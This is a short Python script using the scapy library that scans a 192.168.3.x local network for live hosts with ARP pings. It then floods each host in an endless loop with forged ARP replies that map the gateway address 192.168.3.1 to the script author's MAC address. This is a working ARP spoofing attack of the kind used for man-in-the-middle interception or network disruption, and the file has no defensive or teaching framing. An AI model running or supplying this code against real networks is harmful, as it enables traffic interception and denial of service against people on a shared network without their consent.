from scapy.all import *
from scapy.layers.inet import traceroute
from scapy.layers.l2 import ARP, Ether, arping

from multiprocessing.dummy import Pool as ThreadPool


def who_online(ip_strart,ip_end) -> list:
    online_list = []
    for i in range(ip_strart, ip_end):
        # igone local ip
        if i==81:
            continue
        ip = "192.168.3.{0}".format(i)
        ans, unans = arping(ip, timeout=1)
        if ans:
            online_list.append(ip)
    return online_list


def arp_attack(ip):
    packet = (Ether() / ARP(pdst=ip, hwdst="20:88:10:62:2D:BA",
                            psrc="192.168.3.81", hwsrc="20:88:10:62:2D:BA"))
    ans, unans = srp(packet, timeout=2)
    ans.summary(lambda s, r: r.sprintf("%Ether.src% %ARP.psrc%"))


if __name__ == "__main__":
    # sniff(prn=lambda x:x.show())

    # construct a request arp packet
    # packet = (Ether()/ARP(pdst="192.168.2.1"))
    # ans,unans=srp(packet,timeout=2)
    # ans.summary(lambda s,r:r.sprintf("%Ether.src% %ARP.psrc%"))
    ips = who_online(30,90)
    while True:
        for ip in ips:
            packet = Ether() / ARP(pdst=ip, psrc="192.168.3.1", hwsrc="20:88:10:62:2D:BA")
            sendp(packet)
